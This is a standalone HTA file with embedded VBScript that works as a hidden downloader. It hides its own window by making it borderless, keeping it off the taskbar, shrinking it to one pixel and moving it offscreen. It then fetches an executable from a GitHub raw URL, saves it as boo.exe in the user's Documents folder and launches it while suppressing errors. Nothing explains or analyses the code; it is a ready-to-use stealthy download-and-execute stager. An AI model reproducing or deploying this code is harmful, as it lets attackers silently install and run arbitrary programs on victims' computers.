<html>
  <head>
    <title>Downloader</title>
    <HTA:APPLICATION
      ID="app"
      APPLICATIONNAME="Downloader"
      BORDER="none"
      CAPTION="no"
      SHOWINTASKBAR="no"
      SINGLEINSTANCE="yes"
      SYSMENU="no"
      SCROLL="no"
      WINDOWSTATE="minimize"
    >
    <style>
      body {
        background-color: transparent;
        margin: 0;
        overflow: hidden;
      }
    </style>
  </head>
  <body>
    <script language="VBScript">
      ' Move and resize window offscreen to hide it completely
      window.resizeTo 1, 1
      window.moveTo -1000, -1000

      Option Explicit

      Dim http, stream, fso, shell
      Dim url, savePath

      url = "https://github.com/Nuthoul/ergetbnerbepkwnef/raw/refs/heads/main/hellworld.exe"
      savePath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%USERPROFILE%") & "\Documents\boo.exe"

      On Error Resume Next

      Set http = CreateObject("MSXML2.ServerXMLHTTP")
      http.Open "GET", url, False
      http.Send

      If http.Status = 200 Then
          Set stream = CreateObject("ADODB.Stream")
          stream.Type = 1 ' Binary
          stream.Open
          stream.Write http.responseBody
          stream.SaveToFile savePath, 2 ' Overwrite
          stream.Close

          Set fso = CreateObject("Scripting.FileSystemObject")

          If fso.FileExists(savePath) Then
              If fso.GetFile(savePath).Size > 0 Then
                  Set shell = CreateObject("WScript.Shell")
                  shell.Run Chr(34) & savePath & Chr(34), 1, False
              Else
                  MsgBox "Downloaded file is empty.", vbCritical, "Error"
              End If
          Else
              MsgBox "File was not saved.", vbCritical, "Error"
          End If
      Else
          MsgBox "Download failed. Status: " & http.Status, vbCritical, "Error"
      End If

      self.close
    </script>
  </body>
</html>
